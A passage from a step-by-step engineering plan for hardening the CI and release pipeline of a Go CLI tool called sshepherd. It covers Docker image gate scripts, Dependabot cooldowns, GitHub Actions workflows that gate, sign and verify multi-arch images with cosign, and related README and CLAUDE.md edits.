# `docker image inspect .Size` means different things under the classic and
# containerd image stores, so it can't back a portable budget.
size=$(docker export "$cid" | wc -c | tr -d ' ')
budget=$((SIZE_BUDGET_MB * 1000 * 1000))
if [ "$size" -ge "$budget" ]; then
  echo "FAIL: image is $size bytes, over the ${SIZE_BUDGET_MB} MB budget" >&2
  exit 1
fi
echo "ok: image is $size bytes (budget ${SIZE_BUDGET_MB} MB)"

# The container's config, not `image inspect`: unambiguous for one variant.
user=$(docker inspect -f '{{.Config.User}}' "$cid")
case "$user" in
  "" | root | 0 | root:* | 0:*)
    echo "FAIL: image runs as root (Config.User='$user')" >&2
    exit 1
    ;;
esac
echo "ok: image runs as non-root user '$user'"

# Signals as PID 1: the image has no init, so sshepherd is PID 1, where the
# kernel ignores default signal actions. Block it on an open, empty stdin
# (reading the manifest), then send two SIGTERMs: the first only cancels, the
# second must exit explicitly with 128+15, within a few seconds and not after
# a SIGKILL timeout.
sig=$(docker run -d -i "${plat[@]}" "$IMAGE" apply --dry-run --config /dev/stdin)
sleep "$settle"
docker kill -s TERM "$sig" >/dev/null
sleep 1
docker kill -s TERM "$sig" >/dev/null
for _ in $(seq "$polls"); do
  [ "$(docker inspect -f '{{.State.Running}}' "$sig")" = false ] && break
  sleep 0.5
done
running=$(docker inspect -f '{{.State.Running}}' "$sig")
code=$(docker inspect -f '{{.State.ExitCode}}' "$sig")
if [ "$running" != false ] || [ "$code" != 143 ]; then
  echo "FAIL: a second SIGTERM did not stop the container as PID 1 (running=$running, exit=$code; want exit 143)" >&2
  exit 1
fi
echo "ok: a second SIGTERM stops sshepherd as PID 1 (exit 143)"
```

Note the `{ od …; cat >/dev/null; }` drain. Without it, `od` exits after 20 bytes, `tar` gets SIGPIPE, and `pipefail` aborts the script.

- [ ] **Step 3: Passing.**
  - T1 passes. Under T2, `sshepherd:wrongarch` fails with `FAIL: … ELF machine 183, want 62 for linux/amd64` (or the reverse) and exit 1.
  - Backward compatibility: `IMAGE=sshepherd:dev ./scripts/docker-gates.sh` and `make smoke` both pass, so the Makefile needs no change.
  - Foreign variant under emulation: `docker buildx build --platform <foreign> --load -t sshepherd:foreign . && ./scripts/docker-gates.sh --platform <foreign> sshepherd:foreign` passes, signal gate included. On Docker Desktop, QEMU/Rosetta is built in.
  - If shellcheck is available: `docker run --rm -v "$PWD:/mnt:ro" koalaman/shellcheck:v0.10.0 /mnt/scripts/docker-gates.sh` is clean.
  - Clean up: `docker rmi sshepherd:wrongarch sshepherd:foreign`.

**Risk:** The `od -t u2` read assumes a little-endian host. All supported runners and Macs are LE, and the comment says so. Under QEMU, PID-1 signal timing is the flaky part. The release avoids it by gating arm64 on a native arm runner (B3), and the longer settle/poll covers local emulated runs.

---

#### Task B1: Dependabot cooldown (OPS-6)

**Files:** Modify `.github/dependabot.yml`.

- [ ] **Step 1: Failing check.** `yq -o=json -I=0 '[.updates[].cooldown."default-days"]' .github/dependabot.yml` currently prints `[null,null,null]`.
- [ ] **Step 2: Implement.** Add the block below to each of the three entries, after `schedule:`. Also add one header-comment line: "Cooldown: a new upstream release is proposed only after it has been public 7 days (time for a compromised release to be caught). Dependabot security updates ignore the cooldown and still open at once."

```yaml
    cooldown:
      default-days: 7
```

- [ ] **Step 2b: Split the docker group (review panel, ops-release).** The lockstep check (B2) fails any `golang:` bump until go.mod and the Makefile's `GO_PIN` follow, so a grouped Docker PR that also carries distroless or scanner bumps would sit red behind a manual edit. In the `docker` entry, replace the single `docker-images` group with two groups:

```yaml
    groups:
      golang:                      # red until go.mod + Makefile GO_PIN are bumped on the same PR (see CLAUDE.md)
        patterns: ["golang"]
      runtime-and-ci-images:       # distroless, scanners, sshd test images: never blocked by a Go bump
        patterns: ["*"]
        exclude-patterns: ["golang"]
```

- [ ] **Step 3: Passing.** The check prints `[7,7,7]`, and `yq -o=json -I=0 '[.updates[] | select(.package-ecosystem=="docker") | .groups | keys]' .github/dependabot.yml` prints `[["golang","runtime-and-ci-images"]]`. Confirmation that GitHub parses the file is part of the pre-push CI preflight (Execution model step 6): the integrator checks the "Dependabot updates" run log after the preflight branch push. Nothing validates it locally.

#### Task B2: CI checks the shipped Go, gates arm64, scans published images (OPS-3, OPS-4)

**Files:** Modify `.github/workflows/ci.yml`.

- [ ] **Step 1: Failing checks:**

```bash
yq -o=json -I=0 '[.jobs[].steps[] | select(.uses // "" | test("setup-go")) | .with."go-version-file"]' .github/workflows/ci.yml
# now [null,null,null]                  want ["go.mod","go.mod","go.mod"]
yq -o=json -I=0 '[.jobs.docker.strategy.matrix.include[].runner]' .github/workflows/ci.yml
# now null                              want ["ubuntu-24.04","ubuntu-24.04-arm"]
yq '.jobs.scheduled.steps[].run // ""' .github/workflows/ci.yml | grep -c 'ghcr.io/javadh75/sshepherd'
# now 0                                 want ≥1
```

- [ ] **Step 2: Implement.**
  1. In `go`, `integration` and `scheduled`, replace `go-version: "1.27"` with `go-version-file: go.mod` (keep `cache: true`). go.mod has no `toolchain` line, so this resolves to exactly `1.27.3`.
  2. In `go`, add this step right after setup-go. The scheduled job's `make vuln` then checks the same toolchain as well.

```yaml
      # govulncheck's stdlib verdict is only about the shipped binary when CI,
      # go.mod and the image build stage name the same Go patch release.
      - name: Go toolchain matches the image build stage
        run: |
          mod=$(sed -n 's/^go \([0-9.]*\)$/\1/p' go.mod)
          img=$(sed -n 's/^FROM .*golang:\([0-9.]*\)-alpine@.*/\1/p' Dockerfile)
          pin=$(sed -n 's/^GO_PIN *:= *go//p' Makefile)
          act=$(go env GOVERSION)
          if [ -z "$mod" ] || [ "$mod" != "$img" ] || [ "$mod" != "$pin" ] || [ "go$mod" != "$act" ]; then
            echo "::error::go.mod says go $mod, Dockerfile builds with golang:$img, Makefile GO_PIN is go$pin, CI runs $act; bump all of them together"
            exit 1
          fi
```

  3. `docker` job: make it a matrix and keep everything else.

```yaml
  docker:
    name: Docker image (${{ matrix.arch }})
    if: github.event_name != 'schedule'
    strategy:
      fail-fast: false
      matrix:
        include:
          - { arch: amd64, runner: ubuntu-24.04 }
          - { arch: arm64, runner: ubuntu-24.04-arm }
    runs-on: ${{ matrix.runner }}
```

  Put `if: matrix.arch == 'amd64'` on the two Dockerfile-only steps (hadolint, Trivy config), since they are arch-independent. Build, Trivy image, dockle and `./scripts/docker-gates.sh` run on both legs natively. The pinned Trivy and dockle digests are multi-arch indexes.
  4. **A separate `published-image-scan` job** (review panel, ops-release: inside the `scheduled` job a standing CVE kept the job red every day, which stopped P13's fuzz-corpus save and hid new crashers behind the same red X). Add a new job `published-image-scan` with `name: Published image CVEs`, `if: github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'`, `runs-on: ubuntu-24.04`, `permissions: { contents: read, packages: read }` and the env `TRIVY_IMAGE` (same pin as `docker`). Its steps are checkout plus these two:

```yaml
      - uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # CVEs disclosed after a release (distroless or the Go stdlib) must page
      # for images users already run, not wait for the next tag.
      - name: Scan the published image (Trivy)
        env:
          REF: ghcr.io/javadh75/sshepherd:latest
          TRIVY_USERNAME: ${{ github.actor }}
          TRIVY_PASSWORD: ${{ secrets.GITHUB_TOKEN }}
        run: |
          if ! docker buildx imagetools inspect "$REF" >/dev/null 2>&1; then
            echo "::notice::$REF is not published yet; nothing to scan"
            exit 0
          fi
          for p in linux/amd64 linux/arm64; do
            docker run --rm -e TRIVY_USERNAME -e TRIVY_PASSWORD "$TRIVY_IMAGE" image \
              --image-src remote --platform "$p" \
              --severity HIGH,CRITICAL --exit-code 1 --ignore-unfixed "$REF"
          done
```

  The `scheduled` job keeps its name and gets no scan steps; its crasher-collection steps stay as they are. README says which images are scanned: "the latest release (`:latest`) is scanned daily and gets patch releases; older tags are not re-scanned" (review panel: no release exists yet, so a multi-tag scan loop is not planned now).
  5. **A `ci-ok` aggregator job** (review panel, ops-release), so required checks never name a job that a later wave renames:

```yaml
  ci-ok:
    name: ci-ok
    if: ${{ always() && github.event_name != 'schedule' }}
    needs: [go, docker, integration]
    runs-on: ubuntu-24.04
    steps:
      - name: Every required job passed
        env:
          RESULTS: ${{ join(needs.*.result, ' ') }}
        run: |
          for r in $RESULTS; do
            if [ "$r" != success ]; then echo "::error::a required job ended $r"; exit 1; fi
          done
```

  P13 Task 12 Step 4 keeps `integration` as the matrix job's id, so `needs: [go, docker, integration]` stays valid after the distro rename.

- [ ] **Step 3: Passing.** The three yq checks print the wanted values (the third now reads `.jobs.published-image-scan.steps[].run`), and `yq '.jobs.ci-ok.needs' .github/workflows/ci.yml` lists `go`, `docker`, `integration`. Run `GOTOOLCHAIN=go1.27.3 go run github.com/rhysd/actionlint/cmd/actionlint@v1.7.12 -shellcheck= .github/workflows/ci.yml` (exit 0; shellcheck disabled so the result does not depend on the machine). Run the lockstep step body locally under `GOTOOLCHAIN=go1.27.3` (exit 0). With `sed 's/1.27.3-alpine/1.27.4-alpine/' Dockerfile` substituted for the Dockerfile in a scratch copy, the same body exits 1 with the `::error::` line.

**Risk / friction:** A Dependabot `golang` PR now turns CI red until go.mod's `go` line and the Makefile's `GO_PIN` are bumped on the same PR. That is the point of OPS-3; the separate `golang` group keeps every other image bump flowing, and the integrator documents the procedure in CLAUDE.md ("bump go.mod, the Dockerfile and `GO_PIN` together in one commit"). Required checks name only `ci-ok`.

#### Task B3: Rewrite release.yml: gate, build once, publish by digest (SEC-6, OPS-1, OPS-3, OPS-4, OPS-2)

**Files:** Rewrite `.github/workflows/release.yml`.

- [ ] **Step 1: Failing checks:**

```bash
R=.github/workflows/release.yml
yq -o=json -I=0 '.jobs.publish.needs | sort' $R        # now null  want ["check","gate","image","integration","verify-ref"]
yq '.jobs.publish.if' $R                                 # now null  want startsWith(github.ref, 'refs/tags/v')
yq -o=json -I=0 '.on | has("workflow_dispatch")' $R      # now false want true
yq -o=json -I=0 '[.jobs[] | select(.permissions."id-token" == "write")] | length' $R   # want 1 (publish only; 2 after P13 Task 9 adds release-binaries)
yq '.concurrency.group' $R                               # want release (one global group)
grep -c 'docker/build-push-action' $R                    # now 2     want 1
grep -c 'certificate-github-workflow-trigger push' $R    # now 0     want 1
```

- [ ] **Step 2: Implement.** Write the full file below. All action SHAs are copied from the current release.yml/ci.yml pins, so nothing new needs pinning.

```yaml
name: Release image

# A release is built once and published only after every gate passes:
#   verify-ref   the tag is vMAJOR.MINOR.PATCH and its commit is on master
#   check        make check: lint, gosec, govulncheck, gitleaks, race + coverage
#   integration  make integration: real sshd containers
#   image        hadolint + Trivy config, then ONE multi-arch build (arm64 is
#                cross-compiled) pushed to GHCR by digest only, with no tag
#   gate         per arch on a native runner: docker-gates.sh, Trivy, dockle
#                against that exact digest
#   publish      tags the gated digest, signs it keyless with cosign, and runs
#                the README's `cosign verify` against it
# workflow_dispatch is a dry run: everything except publish. It leaves one
# untagged, unsigned digest in GHCR.
on:
  push:
    tags: ["v[0-9]+.[0-9]+.[0-9]+"]
  workflow_dispatch:

permissions:
  contents: read

# One release at a time, never cancelled: two tags pushed close together
# cannot race each other for `latest`.
concurrency:
  group: release
  cancel-in-progress: false

env:
  IMAGE_REPO: ghcr.io/javadh75/sshepherd # lowercase, as GHCR requires
  # Exact cosign release; README's verify command names it as the minimum.
  # Pin resolution (agent, at execution time): the `cosign-release` default in
  # cosign-installer's action.yml at the SHA pinned below. Step 3 checks it.
  COSIGN_VERSION: <cosign-installer v4.1.3 default cosign-release>
  TRIVY_IMAGE: aquasec/trivy:0.72.0@sha256:cffe3f5161a47a6823fbd23d985795b3ed72a4c806da4c4df16266c02accdd6f
  DOCKLE_IMAGE: goodwithtech/dockle:v0.4.15@sha256:eade932f793742de0aa8755406c7677cd7696f8675b6180926f7eeffa7abe6b9

# Every third-party action is pinned to a full commit SHA (version in the
# trailing comment); every container image by digest. Dependabot bumps both.

jobs:
  verify-ref:
    name: Tag is vX.Y.Z on master
    runs-on: ubuntu-24.04
    outputs:
      version: ${{ steps.ref.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0 # all branches, so origin/master exists

      - name: Refuse a tag that is not vX.Y.Z on master
        id: ref
        run: |
          set -euo pipefail
          sha=$(git rev-parse "${GITHUB_SHA}^{commit}")
          if [[ "$GITHUB_REF" == refs/tags/* ]]; then
            if ! [[ "$GITHUB_REF_NAME" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
              echo "::error::tag $GITHUB_REF_NAME is not vMAJOR.MINOR.PATCH"
              exit 1
            fi
            version="$GITHUB_REF_NAME"
          else
            version="dryrun-${sha::12}"
          fi
          if ! git merge-base --is-ancestor "$sha" origin/master; then
            echo "::error::$sha is not on master; only commits that landed on master are released"
            exit 1
          fi
          echo "version=$version" >> "$GITHUB_OUTPUT"

  check:
    name: Go checks (make check)
    needs: verify-ref
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version-file: go.mod
          cache: true

      - name: Go toolchain matches the image build stage
        run: |
          mod=$(sed -n 's/^go \([0-9.]*\)$/\1/p' go.mod)
          img=$(sed -n 's/^FROM .*golang:\([0-9.]*\)-alpine@.*/\1/p' Dockerfile)
          pin=$(sed -n 's/^GO_PIN *:= *go//p' Makefile)
          act=$(go env GOVERSION)
          if [ -z "$mod" ] || [ "$mod" != "$img" ] || [ "$mod" != "$pin" ] || [ "go$mod" != "$act" ]; then
            echo "::error::go.mod says go $mod, Dockerfile builds with golang:$img, Makefile GO_PIN is go$pin, CI runs $act; bump all of them together"
            exit 1
          fi

      - name: Install pinned tools
        run: |
          make tools
          echo "$(go env GOPATH)/bin" >> "$GITHUB_PATH"

      # Same gate as CI: tidy, fmt, vet, lint, deadcode, gosec, govulncheck
      # (against the exact Go the image ships), gitleaks, race + coverage.
      - name: Quality gate
        run: make check

  integration:
    name: Integration (sshd container)
    needs: verify-ref
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version-file: go.mod
          cache: true

      - name: Run integration tests
        run: make integration

  image:
    name: Build once, push by digest
    needs: verify-ref
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    permissions:
      contents: read
      packages: write # push the untagged digest; tags come only from publish
    outputs:
      digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Lint Dockerfile (hadolint)
        uses: hadolint/hadolint-action@06be81baf89a55ffd0e24b8f04a4185738dd3387 # v3.5.0
        with:
          dockerfile: Dockerfile

      - name: Lint Dockerfile config (Trivy)
        run: |
          docker run --rm -v "$PWD:/src:ro" -w /src "$TRIVY_IMAGE" \
            config --exit-code 1 .

      # No QEMU: the build stage cross-compiles and the runtime stage has no RUN.
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1

      - uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build linux/amd64 + linux/arm64, push by digest
        id: build
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          build-args: VERSION=${{ needs.verify-ref.outputs.version }}
          outputs: type=image,name=${{ env.IMAGE_REPO }},push-by-digest=true,name-canonical=true,push=true
          # BuildKit SBOM + max-mode provenance attestations ride in the index,
          # so tagging the digest later keeps them.
          sbom: true
          provenance: mode=max

      - name: The index carries both platforms
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
        run: |
          set -euo pipefail
          plats=$(docker buildx imagetools inspect --raw "$IMAGE_REPO@$DIGEST" |
            jq -r '.manifests[] | select(.platform.os == "linux") | "linux/\(.platform.architecture)"' | sort | tr '\n' ' ')
          if [ "$plats" != "linux/amd64 linux/arm64 " ]; then
            echo "::error::$IMAGE_REPO@$DIGEST has platforms '$plats', want linux/amd64 linux/arm64"
            exit 1
          fi

  gate:
    name: Gate image (${{ matrix.arch }})
    needs: image
    strategy:
      fail-fast: false
      matrix:
        include:
          - { arch: amd64, runner: ubuntu-24.04 }
          - { arch: arm64, runner: ubuntu-24.04-arm } # native: no QEMU timing
    runs-on: ${{ matrix.runner }}
    timeout-minutes: 20
    permissions:
      contents: read
      packages: read
    env:
      DIGEST: ${{ needs.image.outputs.digest }}
      PLATFORM: linux/${{ matrix.arch }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # ELF arch, --version/--help, size, non-root, PID-1 SIGTERM on the exact
      # pushed digest, the same script `make smoke` and CI run.
      - name: Smoke, arch, size, user and signal gates
        run: ./scripts/docker-gates.sh --pull --platform "$PLATFORM" "$IMAGE_REPO@$DIGEST"

      - name: Scan image for CVEs (Trivy)
        env:
          TRIVY_USERNAME: ${{ github.actor }}
          TRIVY_PASSWORD: ${{ secrets.GITHUB_TOKEN }}
        run: |
          docker run --rm -e TRIVY_USERNAME -e TRIVY_PASSWORD "$TRIVY_IMAGE" image \
            --image-src remote --platform "$PLATFORM" \
            --severity HIGH,CRITICAL --exit-code 1 --ignore-unfixed "$IMAGE_REPO@$DIGEST"

      # The gate step pulled this runner's native variant, so the daemon's copy
      # of the ref is unambiguous here.
      - name: Lint image (dockle)
        # CIS-DI-0006 (HEALTHCHECK) waived: sshepherd is a CLI, not a service.
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
            "$DOCKLE_IMAGE" --exit-code 1 -i CIS-DI-0006 "$IMAGE_REPO@$DIGEST"

  publish:
    name: Tag, sign and verify
    needs: [verify-ref, check, integration, image, gate]
    if: startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: write     # tag the gated digest
      id-token: write     # cosign keyless signing (Sigstore OIDC)
      attestations: write # signed build provenance for the digest
    env:
      DIGEST: ${{ needs.image.outputs.digest }}
    steps:
      # Full tag list, to decide whether this release may move `latest`.
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0

      - name: Is this the newest release?
        id: newest
        run: |
          newest=$(git tag -l 'v*' --sort=-v:refname | head -n1)
          if [ "$newest" = "$GITHUB_REF_NAME" ]; then echo "latest=true" >> "$GITHUB_OUTPUT"; else echo "latest=false" >> "$GITHUB_OUTPUT"; fi

      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1

      - uses: sigstore/cosign-installer@756fe2d284c7292c4e9b62c8a28f1e5629c59532 # v4.1.3
        with:
          cosign-release: ${{ env.COSIGN_VERSION }}

      - uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Image tags
        id: meta
        uses: docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302 # v6.2.0
        with:
          images: ${{ env.IMAGE_REPO }}
          # `latest` is pushed separately, last, and only by the newest release.
          flavor: latest=false
          tags: |
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}

      # Check BEFORE any tag moves (review panel, ops-release): the manifest
      # imagetools would push must hash to the gated digest. Then tag the
      # semver tags, prove each resolves to the digest, and move `latest` last.
      - name: Tag the gated digest
        env:
          TAGS: ${{ steps.meta.outputs.tags }}
          NEWEST: ${{ steps.newest.outputs.latest }}
        run: |
          set -euo pipefail
          planned="sha256:$(docker buildx imagetools create --dry-run "$IMAGE_REPO@$DIGEST" | sha256sum | cut -d' ' -f1)"
          if [ "$planned" != "$DIGEST" ]; then
            echo "::error::imagetools would push $planned, not the gated $DIGEST; no tag was moved"
            exit 1
          fi
          verify() {
            got="sha256:$(docker buildx imagetools inspect --raw "$1" | sha256sum | cut -d' ' -f1)"
            if [ "$got" != "$DIGEST" ]; then echo "::error::$1 resolves to $got, not the gated $DIGEST"; exit 1; fi
          }
          args=()
          while IFS= read -r t; do
            if [ -n "$t" ]; then args+=(--tag "$t"); fi
          done <<< "$TAGS"
          docker buildx imagetools create "${args[@]}" "$IMAGE_REPO@$DIGEST"
          while IFS= read -r t; do
            if [ -n "$t" ]; then verify "$t"; fi
          done <<< "$TAGS"
          if [ "$NEWEST" = true ]; then
            docker buildx imagetools create --tag "$IMAGE_REPO:latest" "$IMAGE_REPO@$DIGEST"
            verify "$IMAGE_REPO:latest"
          fi

      # Signed provenance users can check (BuildKit's attestations in the
      # index are unsigned). Pin resolution (agent, at execution time): the
      # newest attest-build-provenance release at least 7 days old, SHA from
      # `gh api repos/actions/attest-build-provenance/git/ref/tags/<tag>`.
      - name: Attest build provenance
        uses: actions/attest-build-provenance@<resolved release SHA> # <its tag>
        with:
          subject-name: ${{ env.IMAGE_REPO }}
          subject-digest: ${{ env.DIGEST }}
          push-to-registry: true

      - name: Sign the digest (cosign keyless)
        run: cosign sign --yes "$IMAGE_REPO@$DIGEST"

      # Keep this command byte-identical to README.md "Releases".
      - name: Verify the signature the way users do
        run: |
          cosign verify "$IMAGE_REPO@$DIGEST" \
            --certificate-identity-regexp '^https://github\.com/javadh75/SSHepherd/\.github/workflows/release\.yml@refs/tags/v[0-9]+\.[0-9]+\.[0-9]+$' \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
            --certificate-github-workflow-trigger push \
            --certificate-github-workflow-repository javadh75/SSHepherd >/dev/null
```

Design notes (keep these as comments in the file only where shown above):
- **Why `merge-base` matters beyond mis-tags.** A tag push runs the release.yml *from the tagged commit*. Requiring that commit to be on master means the workflow that runs, and its gates, is reviewed master content. A tag on a stripped-down side commit is refused. A tag ruleset (D6) is still the only defense against someone who can push to master.
- **Least privilege.** `image` has `packages: write` but no OIDC. `gate` is read-only. Only `publish`, which runs after every gate, can sign.
- `latest` moves only when this tag is the newest `v*` tag, in a separate step after the semver tags verify, so an older patch release can never move `latest` backwards. The README stops recommending `latest` for unattended runs (I2).
- **One signing job.** The dispatch (dry-run) path never gets `packages: write` + `id-token: write`: a canary-signing job would hand a dispatchable run exactly the privilege this gating removes, so the panel's canary idea is not adopted. The dispatch run still exercises the `imagetools create --dry-run` hash check against its own untagged digest (V1).

- [ ] **Step 3: Passing.** All seven Step 1 checks print the wanted values, and `grep -c '<' <(yq '.env.COSIGN_VERSION, .jobs.publish.steps[].uses // ""' .github/workflows/release.yml)` prints `0` (both pins resolved; `COSIGN_VERSION` matches `^v[0-9]+\.[0-9]+\.[0-9]+$`). Then `GOTOOLCHAIN=go1.27.3 go run github.com/rhysd/actionlint/cmd/actionlint@v1.7.12 -shellcheck= .github/workflows/release.yml .github/workflows/ci.yml` exits 0 (the same command every wave exit runs).

**Risks:**
- (a) `imagetools create` with a single index source should re-push it unchanged. The `--dry-run` hash check runs **before** any tag moves, so a surprise fails the job with every tag untouched. If it ever fails, the fallback is a manifest-preserving `crane tag` (go-containerregistry, pinned by version in the workflow).

#### Release recovery (runbook; the integrator also puts it in README's Releases paragraph)

1. **A gate or check flakes:** `gh run rerun <run-id> --failed`. Successful jobs keep their outputs, so the same digest is gated and published.
2. **release.yml itself is wrong:** fix it on master and tag `vX.Y.Z+1`. Never re-tag: the `v*` ruleset (D6) forbids moving or deleting a tag, and a re-run always uses the tagged commit's workflow.
3. **A published release is bad:** move `latest` back to the previous signed digest with `docker buildx imagetools create --tag ghcr.io/javadh75/sshepherd:latest ghcr.io/javadh75/sshepherd@<previous signed digest>`, then run the README `cosign verify` against it, then cut a fixed `vX.Y.Z+1`.
- (b) A dry-run dispatch leaves one untagged, unsigned digest under the GHCR package. It is harmless, and the owner can delete it from the package page.
- (c) If `ubuntu-24.04-arm` capacity is ever unavailable, the fallback is the amd64 runner with `docker/setup-qemu-action` (SHA `99012661954931238ded8c8b007157a8430204e1`, v4.4.0). docker-gates.sh already lengthens settle and polls for emulated platforms.

---

#### Task I1: Integrate and verify locally (integrator)

- [ ] Apply A's and B's diffs. They touch disjoint files, so there are no conflicts.
- [ ] Run the local gates:

```bash
GOTOOLCHAIN=go1.27.3 go run github.com/rhysd/actionlint/cmd/actionlint@v1.7.12 .github/workflows/ci.yml .github/workflows/release.yml
make docker docker-lint docker-scan smoke
./scripts/docker-gates.sh --platform "linux/$(docker version -f '{{.Server.Arch}}')" sshepherd:dev
docker buildx build --platform linux/arm64 --load -t sshepherd:arm64 . && ./scripts/docker-gates.sh --platform linux/arm64 sshepherd:arm64
docker buildx build --platform linux/amd64 --load -t sshepherd:amd64 . && ./scripts/docker-gates.sh --platform linux/amd64 sshepherd:amd64
make check
make integration
```

  Also re-run every yq assertion from B1-B3 and the A1 cross-stage grep.

#### Task I2: README deltas (integrator, same commit)

- [ ] **Kubernetes CronJob (README.md:1300-1316), OPS-11.** Replace the block with the version below and keep the existing secret/`fsGroup` explanation that follows it. `apply` writes nothing to the local filesystem (the only local writers are `manifest_out.go:83` and `edit.go:139`, used by adopt/import/revoke/rotate), so `readOnlyRootFilesystem` is safe for this example. Add one sentence: "`revoke`/`rotate` edit the manifest, so mount it from a writable volume for those."

```yaml
containers:
  - name: sshepherd
    # Pin the digest you verified with `cosign verify` (see Releases), never
    # :latest, for an unattended `apply --yes`.
    image: ghcr.io/javadh75/sshepherd:<version>@sha256:<digest>
    args: ["apply", "--yes", "--identity", "/secrets/ci",
           "--identity-passphrase-file", "/secrets/ci.pass",
           "--config", "/config/sshepherd.yaml", "--known-hosts", "/config/known_hosts"]
    securityContext:
      runAsNonRoot: true
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
      capabilities: {drop: ["ALL"]}
      seccompProfile: {type: RuntimeDefault}
    volumeMounts:
      - {name: secrets, mountPath: /secrets, readOnly: true}
securityContext:
  fsGroup: 65532
volumes:
  - name: secrets
    secret: {secretName: sshepherd-ci, defaultMode: 0440}
```

  Add a line on how to get the digest: `docker buildx imagetools inspect ghcr.io/javadh75/sshepherd:<version> --format '{{json .Manifest.Digest}}'`, then verify it as shown under Releases.
- [ ] **Dev "Container work" paragraph (README.md:1485-1491).** The `smoke` description becomes: "`--version` and `--help`, the binary's ELF architecture matches the image platform, an image size budget under 30 MB (`SIZE_BUDGET_MB`), a non-root user check, and the PID-1 SIGTERM gate. `scripts/docker-gates.sh [--platform OS/ARCH] [--pull] [IMAGE]` checks one variant of any local or registry image." Append to "CI also runs `govulncheck` and every fuzz target daily": ", and Trivy-scans the published `latest` image for both architectures". Also add: "CI builds and gates the image natively on amd64 and arm64."
- [ ] **Releases paragraph (README.md:1493-1501), OPS-2 + SEC-6/OPS-1.** Replace it with the text below. **Copy the `cosign verify` lines from release.yml's last step, not from this plan** ("real output" rule).

  > **Releases.** Pushing a `vMAJOR.MINOR.PATCH` tag runs `.github/workflows/release.yml`. It refuses a tag whose commit is not on `master`, then runs `make check` (including `govulncheck` on the exact Go the image ships) and `make integration`. It builds the `linux/amd64` + `linux/arm64` image once (arm64 is cross-compiled) and pushes it by digest only. Then it gates that exact digest on native amd64 and arm64 runners with hadolint, Trivy (fails on HIGH/CRITICAL), dockle and `scripts/docker-gates.sh`. Only when every job passes does it tag the digest with semver tags (`latest` last, and only for the newest release), sign it keyless with cosign, attach signed build provenance, and verify that signature with the command below. Verify an image before you run it (requires cosign ≥ the `COSIGN_VERSION` in release.yml; older cosign v2 may report "no signatures found"):

```console
$ cosign verify ghcr.io/javadh75/sshepherd@<digest> \
    --certificate-identity-regexp '^https://github\.com/javadh75/SSHepherd/\.github/workflows/release\.yml@refs/tags/v[0-9]+\.[0-9]+\.[0-9]+$' \
    --certificate-oidc-issuer https://token.actions.githubusercontent.com \
    --certificate-github-workflow-trigger push \
    --certificate-github-workflow-repository javadh75/SSHepherd
```

  Add: "This accepts only signatures made by `release.yml` running on a release tag. Use the same identity in an admission policy. Check the provenance with `gh attestation verify oci://ghcr.io/javadh75/sshepherd@<digest> --repo javadh75/SSHepherd`. The latest release is scanned for CVEs daily and gets patch releases; older tags are not re-scanned." Then add the three-step **Release recovery** list from B3.

#### Task I3: CLAUDE.md deltas (integrator, same commit), UX-12 residual

- [ ] **Container image › Build (CLAUDE.md:181-183).** "a `golang:<ver>-alpine` build stage **on `$BUILDPLATFORM`** (pinned by digest, `GOTOOLCHAIN=local`) cross-compiles the static binary with `GOOS=$TARGETOS GOARCH=$TARGETARCH` (no QEMU at build time; keep the runtime stage free of `RUN`)". Multi-arch bullet (`:193`): "build `linux/amd64` + `linux/arm64` once with `docker buildx`; gate each variant natively".
- [ ] **Docker checks (`:195-206`).** Heading: "Docker checks (CI on both arches, and on every release's pushed digest before it is tagged and signed)". Add the bullet "**Architecture gate**: the binary's ELF machine must match the image platform (`docker-gates.sh`)". The Provenance bullet gets: "verify identity is pinned to `release.yml@refs/tags/vX.Y.Z` with trigger `push`".
